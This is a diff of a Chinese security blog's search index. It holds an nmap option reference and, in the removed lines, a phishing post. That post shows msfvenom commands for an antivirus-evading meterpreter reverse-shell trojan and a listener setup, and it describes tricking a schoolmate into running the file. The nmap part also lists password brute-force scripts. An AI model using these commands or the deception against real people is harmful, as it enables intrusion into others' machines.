@@ -1,143 +1,146 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>1</title>
-    <url>/post/83dcefb7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>这是一次测试</p>
-<h1 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h1><p>测试</p>
-<h2 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h2>]]></content>
-  </entry>
-  <entry>
-    <title>爱安全-价值1800的无线WLAN攻防教程</title>
-    <url>/post/d0056290/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>无线WLAN攻防课程<br><a href="https://s1.ax1x.com/2020/08/15/dkdz8S.gif"><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/15/dkdz8S.gif" alt="img"></a><br>加Q群702861483联系群主领取资料<br>【网络安全技术讨论群】：<a href="https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC">https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC</a></p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>渗透测试之心收集</title>
+      <link href="/post/83dcefb7/"/>
+      <url>/post/83dcefb7/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记一次渗透外网</title>
+      <link href="/post/f65a2643/"/>
+      <url>/post/f65a2643/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h2><p>- </p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>无线攻击之aircrack-ng破解无线密码</title>
+      <link href="/post/19ad867/"/>
+      <url>/post/19ad867/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h1><ul><li>环境准备</li><li></li></ul><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>准备USB无线网卡</p>]]></content>
+      
+      
       <categories>
-        <category>资料分享</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>网安学习资源</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集之nmap</title>
-    <url>/post/96512c85/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x01-nmap介绍"><a href="#0x01-nmap介绍" class="headerlink" title="0x01 nmap介绍"></a>0x01 nmap介绍</h1><p>Nmap是一个开源，免费的网络探测工具，可以用来探测存活主机以及开放的端口等，支持windows，linux，mac等多种操作系统。</p>
-<p><a href="https://nmap.org/download.html">nmap下载官网</a></p>
-<h1 id="0x02nmap常用功能"><a href="#0x02nmap常用功能" class="headerlink" title="0x02nmap常用功能"></a>0x02nmap常用功能</h1><ul>
-<li>探测主机存活</li>
-<li>扫描端口</li>
-<li>探测主机操作系统信息</li>
-<li>检测漏洞</li>
-</ul>
-<h1 id="0x03-nmap实战"><a href="#0x03-nmap实战" class="headerlink" title="0x03 nmap实战"></a>0x03 nmap实战</h1><p>nmap 常用的几个参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -v ip    显示详细的扫描过程</span><br><span class="line">nmap -p  ip  扫描指定端口</span><br><span class="line">nmap -A ip  全面扫描操作系统</span><br><span class="line">nmap -sP ip  进行ping扫描主机存活</span><br><span class="line">nmap -Pn&#x2F;-P0 ip 禁ping扫描</span><br><span class="line">nmap -sS ip 进行tcp syn扫描 也叫半开放扫描</span><br><span class="line">nmap -sT ip 进行tcp连接扫描 （准确性高）</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
-
-<p>端口状态信息</p>
-<blockquote>
-<p>open ：端口开启<br>closed ：端口关闭<br>filtered ：端口被过滤，因为报文被防火墙拦截<br>Unfiltered ：不确定端口是否开放 没有被过滤<br>open|filtered(closed|filtered) ：不能确定端口是否开放（关闭）或者被过滤</p>
-</blockquote>
-<h1 id="0x04-nmap中文说明文档"><a href="#0x04-nmap中文说明文档" class="headerlink" title="0x04 nmap中文说明文档"></a>0x04 nmap中文说明文档</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TARGET SPECIFICATION  目标说明</span><br><span class="line"></span><br><span class="line">-iL 从主机地址列表文件中导入扫描地址</span><br><span class="line">-iR 随机选择目标进行扫描，unm hosts 表示数目，设置为0则无休止扫描</span><br><span class="line">--exclude 排除某个主机地址</span><br><span class="line">--excludefile 排除主机列表文件中的地址</span><br><span class="line">*************************************************************</span><br><span class="line">HOST DISCOVERY 主机发现</span><br><span class="line"></span><br><span class="line">-sL 列表扫描，仅将指定的目标IP列举出来，不进行主机发现</span><br><span class="line">-sn 和-sP一样，只利用ping扫描进行主机发现，不扫描目标主机的端口</span><br><span class="line">-Pn 将所有指定的主机视为已开启状态，跳过主机发现过程</span><br><span class="line">-PS  TCP SYN ping ，发送一个设置了SYN标志位的TCP报文，默认端口为80，也可指定端口</span><br><span class="line">-PA  TCP ACK ping，发送一个设置了ACK标志位的TCP报文，默认端口为80，也可指定带你看</span><br><span class="line">-PU  UDP ping ,发送一个空的UDP报文到指定端口，可穿透只过滤TCp的防火墙</span><br><span class="line">-P0 使用IP协议ping</span><br><span class="line">-PR 使用ARP ping</span><br><span class="line">-n&#x2F;-R    -n不用域名解析，加速扫描，-R为目标IP做为反向解析域名，扫描较慢一些</span><br><span class="line">-dns-servers 自定义域名解析服务器地址</span><br><span class="line">-traceroute  目标主机路由追踪</span><br><span class="line">*************************************************************</span><br><span class="line">SCAN TECHNIQUER     端口扫描</span><br><span class="line"></span><br><span class="line">nmap 将目标端口分为6种状态：</span><br><span class="line">open（开放的）</span><br><span class="line">closed（关闭的）</span><br><span class="line">filtered （被过滤的）</span><br><span class="line">unfiltered （未被过滤的）可访问但不确定开发情况</span><br><span class="line">open|filtered （开放或者被过滤）无法确定端口是否开放的还是被过滤的</span><br><span class="line">closed|filtered （关闭或者被过滤）无法确定端口是否关闭还是被过滤的</span><br><span class="line">nmap产生的结果基于目标机器的响应报文的，而这些主机肯能是不可信任的。会产生迷惑或者误导nmap的报文</span><br><span class="line"></span><br><span class="line">-sS   TCP SYN 扫描，不进行ping 半开放扫描，速度快隐蔽性好（不完成TCP连接），能够明确区分端口状态</span><br><span class="line">-sT   TCP 连接扫描，容易产生记录，效率低</span><br><span class="line">-sA   TCP ACK扫描，只设置ACK标志位，区别被过滤与未被过滤的</span><br><span class="line">-sU   UDP 服务扫描，例如DNS&#x2F;DHCP等，效率低</span><br><span class="line">-sN;-sF;-sX    TCP Null,Fin,Xmas扫描，从RFC挖掘的微妙方法来区分开放关闭端口</span><br><span class="line">-sl    利用僵尸主机上已知IP分段ID序列生成算法来探测目标上开放端口的信息，极端隐蔽</span><br><span class="line">-sO  IP协议扫描，可以确定目标主机支持哪些IP协议，例如TCP&#x2F;ICMP等</span><br><span class="line">************************************************************************</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER 端口说明和扫描顺序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-p  指定扫描的端口，可以是单个端口，也可以是端口范围，可以指定UDP或TCP协议扫描特定端口</span><br><span class="line">-p&lt;name&gt; 指定扫描的协议，例如-p http 即可扫描http协议的端口状态</span><br><span class="line">--exclude-ports  排除指定端口不扫描</span><br><span class="line">-F 极速模式，仅扫描100个常用端口</span><br><span class="line">************************************************************************</span><br><span class="line">SERVICE&#x2F;VERSION DETECTION  服务与版本探测。</span><br><span class="line"></span><br><span class="line">Nmap-services  包含大量服务的数据库，Nmap通过查询该数据库可以报告哪些端口可能对应于扫描服务，但不一定正确</span><br><span class="line">-sV 进行服务版本探测</span><br><span class="line">--version-intensity&lt;level&gt; 设置版本扫描强度，范围为0-9，默认是7，强度越高，时间越长，服务越可能被正确识别</span><br><span class="line">************************************************************************</span><br><span class="line">SCRIPT SCAN  脚本扫描</span><br><span class="line"></span><br><span class="line">允许用户自己编写的脚本来执行自动化的操作或者扩展nmap的功能，使用Lua脚本语言。</span><br><span class="line">-sC  使用默认类别的脚本进行扫描</span><br><span class="line">--script&#x3D;&lt;Lua scripts&gt;  使用某个或某类脚本进行扫描，支持统配符描述</span><br><span class="line">************************************************************************</span><br><span class="line">OS DETECTION 操作系统探测</span><br><span class="line"></span><br><span class="line">用TCP&#x2F;IP协议栈fingerprinting进行探测，Nmap发送一系列TCP和UDP报文到远程主机，检查响应的每一个比特。测试后Nmap吧结果和数据库中超过1500个已知的fingerprints比较，如匹配则输出结果</span><br><span class="line"></span><br><span class="line">-O  启用操作系统探测</span><br><span class="line">-A 同时启用操作系统探测和服务版本探测</span><br><span class="line">--osscan-limit 针对指定的目标进行操作系统检测</span><br><span class="line">--osscan-guess  当nmap无法确定所检测的操作系统时，会尽可能地提供相近的匹配</span><br><span class="line">************************************************************************</span><br><span class="line">TIMING AND PERFORMANCE  时间和性能</span><br><span class="line">Nmap开发的最高优先级是性能，但实际应用中很多因素会添加扫描时间，比如特定的扫描选项，防火墙配置以及版本扫描等</span><br><span class="line"></span><br><span class="line">-T&lt;0-5&gt; 设置模板级数，在0-5中选择。T0、T1用于IDS规避，T2降低了扫描速度以使用更少的带宽和资源。默认为T3，未作任何优化。T4假设具有合适及可靠的网络从而加速扫描。T5假设具有特别快的网络或者愿为速度牺牲准确性</span><br><span class="line">-host-timeout&lt;time&gt; 放弃低速目标主机，时间单位为毫秒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">扫描漏洞</span><br><span class="line">nmap --script&#x3D;vuln ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、提供暴力破解的方式，可对数据库、smb、snmp等进行简单密码的暴力猜解</span><br><span class="line">nmap --script&#x3D;brute 192.168.88.131</span><br><span class="line"> </span><br><span class="line">4、利用FTP指定脚本对目标特定FTP协议进行密码爆破</span><br><span class="line">nmap --script&#x3D;ftp-brute.nse 192.168.88.131</span><br><span class="line"> </span><br><span class="line">5、利用第三方的数据库或资源，例如进行whoise解析</span><br><span class="line">nmap --script&#x3D;external 192.168.88.131</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 破解WiFi </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>信息收集之nmap</title>
+      <link href="/post/96512c85/"/>
+      <url>/post/96512c85/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x01-nmap介绍"><a href="#0x01-nmap介绍" class="headerlink" title="0x01 nmap介绍"></a>0x01 nmap介绍</h1><p>Nmap是一个开源，免费的网络探测工具，可以用来探测存活主机以及开放的端口等，支持windows，linux，mac等多种操作系统。</p><p><a href="https://nmap.org/download.html">nmap下载官网</a></p><h1 id="0x02nmap常用功能"><a href="#0x02nmap常用功能" class="headerlink" title="0x02nmap常用功能"></a>0x02nmap常用功能</h1><ul><li>探测主机存活</li><li>扫描端口</li><li>探测主机操作系统信息</li><li>检测漏洞</li></ul><h1 id="0x03-nmap实战"><a href="#0x03-nmap实战" class="headerlink" title="0x03 nmap实战"></a>0x03 nmap实战</h1><p>nmap 常用的几个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -v ip    显示详细的扫描过程</span><br><span class="line">nmap -p  ip  扫描指定端口</span><br><span class="line">nmap -A ip  全面扫描操作系统</span><br><span class="line">nmap -sP ip  进行ping扫描主机存活</span><br><span class="line">nmap -Pn&#x2F;-P0 ip 禁ping扫描</span><br><span class="line">nmap -sS ip 进行tcp syn扫描 也叫半开放扫描</span><br><span class="line">nmap -sT ip 进行tcp连接扫描 （准确性高）</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><p>端口状态信息</p><blockquote><p>open ：端口开启<br>closed ：端口关闭<br>filtered ：端口被过滤，因为报文被防火墙拦截<br>Unfiltered ：不确定端口是否开放 没有被过滤<br>open|filtered(closed|filtered) ：不能确定端口是否开放（关闭）或者被过滤</p></blockquote><h1 id="0x04-nmap中文说明文档"><a href="#0x04-nmap中文说明文档" class="headerlink" title="0x04 nmap中文说明文档"></a>0x04 nmap中文说明文档</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">TARGET SPECIFICATION  目标说明</span><br><span class="line"></span><br><span class="line">-iL 从主机地址列表文件中导入扫描地址</span><br><span class="line">-iR 随机选择目标进行扫描，unm hosts 表示数目，设置为0则无休止扫描</span><br><span class="line">--exclude 排除某个主机地址</span><br><span class="line">--excludefile 排除主机列表文件中的地址</span><br><span class="line">*************************************************************</span><br><span class="line">HOST DISCOVERY 主机发现</span><br><span class="line"></span><br><span class="line">-sL 列表扫描，仅将指定的目标IP列举出来，不进行主机发现</span><br><span class="line">-sn 和-sP一样，只利用ping扫描进行主机发现，不扫描目标主机的端口</span><br><span class="line">-Pn 将所有指定的主机视为已开启状态，跳过主机发现过程</span><br><span class="line">-PS  TCP SYN ping ，发送一个设置了SYN标志位的TCP报文，默认端口为80，也可指定端口</span><br><span class="line">-PA  TCP ACK ping，发送一个设置了ACK标志位的TCP报文，默认端口为80，也可指定带你看</span><br><span class="line">-PU  UDP ping ,发送一个空的UDP报文到指定端口，可穿透只过滤TCp的防火墙</span><br><span class="line">-P0 使用IP协议ping</span><br><span class="line">-PR 使用ARP ping</span><br><span class="line">-n&#x2F;-R    -n不用域名解析，加速扫描，-R为目标IP做为反向解析域名，扫描较慢一些</span><br><span class="line">-dns-servers 自定义域名解析服务器地址</span><br><span class="line">-traceroute  目标主机路由追踪</span><br><span class="line">*************************************************************</span><br><span class="line">SCAN TECHNIQUER     端口扫描</span><br><span class="line"></span><br><span class="line">nmap 将目标端口分为6种状态：</span><br><span class="line">open（开放的）</span><br><span class="line">closed（关闭的）</span><br><span class="line">filtered （被过滤的）</span><br><span class="line">unfiltered （未被过滤的）可访问但不确定开发情况</span><br><span class="line">open|filtered （开放或者被过滤）无法确定端口是否开放的还是被过滤的</span><br><span class="line">closed|filtered （关闭或者被过滤）无法确定端口是否关闭还是被过滤的</span><br><span class="line">nmap产生的结果基于目标机器的响应报文的，而这些主机肯能是不可信任的。会产生迷惑或者误导nmap的报文</span><br><span class="line"></span><br><span class="line">-sS   TCP SYN 扫描，不进行ping 半开放扫描，速度快隐蔽性好（不完成TCP连接），能够明确区分端口状态</span><br><span class="line">-sT   TCP 连接扫描，容易产生记录，效率低</span><br><span class="line">-sA   TCP ACK扫描，只设置ACK标志位，区别被过滤与未被过滤的</span><br><span class="line">-sU   UDP 服务扫描，例如DNS&#x2F;DHCP等，效率低</span><br><span class="line">-sN;-sF;-sX    TCP Null,Fin,Xmas扫描，从RFC挖掘的微妙方法来区分开放关闭端口</span><br><span class="line">-sl    利用僵尸主机上已知IP分段ID序列生成算法来探测目标上开放端口的信息，极端隐蔽</span><br><span class="line">-sO  IP协议扫描，可以确定目标主机支持哪些IP协议，例如TCP&#x2F;ICMP等</span><br><span class="line">************************************************************************</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER 端口说明和扫描顺序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-p  指定扫描的端口，可以是单个端口，也可以是端口范围，可以指定UDP或TCP协议扫描特定端口</span><br><span class="line">-p&lt;name&gt; 指定扫描的协议，例如-p http 即可扫描http协议的端口状态</span><br><span class="line">--exclude-ports  排除指定端口不扫描</span><br><span class="line">-F 极速模式，仅扫描100个常用端口</span><br><span class="line">************************************************************************</span><br><span class="line">SERVICE&#x2F;VERSION DETECTION  服务与版本探测。</span><br><span class="line"></span><br><span class="line">Nmap-services  包含大量服务的数据库，Nmap通过查询该数据库可以报告哪些端口可能对应于扫描服务，但不一定正确</span><br><span class="line">-sV 进行服务版本探测</span><br><span class="line">--version-intensity&lt;level&gt; 设置版本扫描强度，范围为0-9，默认是7，强度越高，时间越长，服务越可能被正确识别</span><br><span class="line">************************************************************************</span><br><span class="line">SCRIPT SCAN  脚本扫描</span><br><span class="line"></span><br><span class="line">允许用户自己编写的脚本来执行自动化的操作或者扩展nmap的功能，使用Lua脚本语言。</span><br><span class="line">-sC  使用默认类别的脚本进行扫描</span><br><span class="line">--script&#x3D;&lt;Lua scripts&gt;  使用某个或某类脚本进行扫描，支持统配符描述</span><br><span class="line">************************************************************************</span><br><span class="line">OS DETECTION 操作系统探测</span><br><span class="line"></span><br><span class="line">用TCP&#x2F;IP协议栈fingerprinting进行探测，Nmap发送一系列TCP和UDP报文到远程主机，检查响应的每一个比特。测试后Nmap吧结果和数据库中超过1500个已知的fingerprints比较，如匹配则输出结果</span><br><span class="line"></span><br><span class="line">-O  启用操作系统探测</span><br><span class="line">-A 同时启用操作系统探测和服务版本探测</span><br><span class="line">--osscan-limit 针对指定的目标进行操作系统检测</span><br><span class="line">--osscan-guess  当nmap无法确定所检测的操作系统时，会尽可能地提供相近的匹配</span><br><span class="line">************************************************************************</span><br><span class="line">TIMING AND PERFORMANCE  时间和性能</span><br><span class="line">Nmap开发的最高优先级是性能，但实际应用中很多因素会添加扫描时间，比如特定的扫描选项，防火墙配置以及版本扫描等</span><br><span class="line"></span><br><span class="line">-T&lt;0-5&gt; 设置模板级数，在0-5中选择。T0、T1用于IDS规避，T2降低了扫描速度以使用更少的带宽和资源。默认为T3，未作任何优化。T4假设具有合适及可靠的网络从而加速扫描。T5假设具有特别快的网络或者愿为速度牺牲准确性</span><br><span class="line">-host-timeout&lt;time&gt; 放弃低速目标主机，时间单位为毫秒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">扫描漏洞</span><br><span class="line">nmap --script&#x3D;vuln ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、提供暴力破解的方式，可对数据库、smb、snmp等进行简单密码的暴力猜解</span><br><span class="line">nmap --script&#x3D;brute 192.168.88.131</span><br><span class="line"> </span><br><span class="line">4、利用FTP指定脚本对目标特定FTP协议进行密码爆破</span><br><span class="line">nmap --script&#x3D;ftp-brute.nse 192.168.88.131</span><br><span class="line"> </span><br><span class="line">5、利用第三方的数据库或资源，例如进行whoise解析</span><br><span class="line">nmap --script&#x3D;external 192.168.88.131</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于本博客</title>
-    <url>/post/4a17b156/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>本博客搭建时间为2020.01.01</h1>
-
-<p>By xiaochen</p>
-<div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">关于作者</button></li><li class="tab"><button type="button" data-href="#test3-2">关于博客</button></li><li class="tab"><button type="button" data-href="#test3-3">联系作者</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>一个正在上岸的网安萌新</strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>本站用于记录本人成长日记，以及分享一些杂七杂八的知识和学习资源.</strong></p>
-<p><strong>分享网络安全相关的文章以及学习资料</strong></p>
-<p><strong>本站内容同步至<a href="https://hixiaochen.gitee.io/" title="My Gitee">Gitee</a></strong></p>
-<p>其他博客文章<a href="https://blog.csdn.net/oo798" title="My CSDN">CSDN</a> ||<a href="https://www.cnblogs.com/hixiaochen/" title="My Blog garden">博客园</a></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>QQ:488675848.</strong><br><strong>email:<a href="mailto:&#x34;&#x38;&#56;&#54;&#55;&#53;&#x38;&#52;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x34;&#x38;&#56;&#54;&#55;&#53;&#x38;&#52;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-<hr>]]></content>
-  </entry>
-  <entry>
-    <title>无线攻击之aircrack-ng破解无线密码</title>
-    <url>/post/19ad867/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h1><ul>
-<li>环境准备</li>
-<li></li>
-</ul>
-<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>准备USB无线网卡</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>爱安全-价值1800的无线WLAN攻防教程</title>
+      <link href="/post/d0056290/"/>
+      <url>/post/d0056290/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>无线WLAN攻防课程<br><a href="https://s1.ax1x.com/2020/08/15/dkdz8S.gif"><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/15/dkdz8S.gif" alt="img"></a><br>加Q群702861483联系群主领取资料<br>【网络安全技术讨论群】：<a href="https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC">https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC</a></p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 资料分享 </category>
+          
       </categories>
-      <tags>
-        <tag>破解WiFi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网渗透之钓鱼篇</title>
-    <url>/post/40a967b4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm…这个原因就不说了哈哈 懂得都懂</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p>
-<h2 id="渗透内网"><a href="#渗透内网" class="headerlink" title="渗透内网"></a>渗透内网</h2><p>渗透内网指的是在</p>
-<h1 id="0x02-准备环境"><a href="#0x02-准备环境" class="headerlink" title="0x02 准备环境"></a>0x02 准备环境</h1><p>攻击机：kali</p>
-<p>靶机：学弟的Pc</p>
-<h2 id="开始制作木马"><a href="#开始制作木马" class="headerlink" title="开始制作木马"></a>开始制作木马</h2><p>裸奔木马</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -f exe &gt; /root/test.exe</code></p>
-<p>免杀木马</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -e x86/shikata_ga_nai -x caidao.exe -i 12 -f exe -o /var/www/html/caidao.exe</code></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th align="center">备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-e</td>
-<td align="center">指定编码方式对攻击载荷进行重新编译</td>
-</tr>
-<tr>
-<td>-x</td>
-<td align="center">指定木马捆绑在哪个可执行程序模版上</td>
-</tr>
-<tr>
-<td>-i</td>
-<td align="center">指定对目标编码的次数，多次编码理论上来讲有助于免杀</td>
-</tr>
-<tr>
-<td>-f</td>
-<td align="center">指定MSF编码器输出的程序格式</td>
-</tr>
-<tr>
-<td>-o</td>
-<td align="center">指定处理完毕后的文件输出路径</td>
-</tr>
-</tbody></table>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p>
-<p>把木马放到html下</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p>
-<h2 id="运行msf监听模块"><a href="#运行msf监听模块" class="headerlink" title="运行msf监听模块"></a>运行msf监听模块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 172.18.9.70</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x03-开始攻击"><a href="#0x03-开始攻击" class="headerlink" title="0x03 开始攻击"></a>0x03 开始攻击</h1><p>首先先诱导学弟点开链接并下载执行木马</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p>
-<p>当学弟执行木马文件后 获得shell</p>
-<p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p>
